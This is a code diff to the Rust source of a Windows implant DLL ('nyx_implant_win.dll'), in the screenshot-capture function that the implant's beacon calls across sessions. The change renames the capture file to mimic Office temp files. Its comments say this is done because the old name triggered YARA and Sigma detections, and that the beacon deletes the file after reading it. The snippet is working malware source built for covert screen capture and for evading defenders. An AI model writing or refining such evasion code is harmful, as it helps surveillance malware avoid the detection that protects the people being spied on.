@@ -449,8 +449,14 @@ pub unsafe extern "system" fn nyx_beacon_oneshot() {
 /// `rundll32 nyx_implant_win.dll,nyx_screenshot_session`.
 #[no_mangle]
 pub unsafe extern "system" fn nyx_screenshot_session() {
-    let path = b"C:\\Windows\\Temp\\nyx_shot.bmp\0";
-    // TEMP: DPI virtualization probe (see screenshot::dpi_probe_diag).
+    // Capture target: a non-descript temp file name. The fixed `nyx_shot.bmp`
+    // string was a durable IOC (yara/sigma hit on every cross-session capture);
+    // `~dfftmp.bmp` blends with the many `~DfXXXX.tmp` files the Office/filter-
+    // driver ecosystem litters under %TEMP%, and the file is deleted by the
+    // beacon once read back (cross_session_capture:1262 del_file).
+    let path = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";
+    // DPI virtualization probe (debug only — compiled out of production).
+    #[cfg(feature = "selftest")]
     unsafe { crate::screenshot::dpi_probe_diag() };
     // Propagate capture success/failure into the exit code so the Session-0
     // beacon can distinguish a helper that genuinely produced a BMP (exit 0)
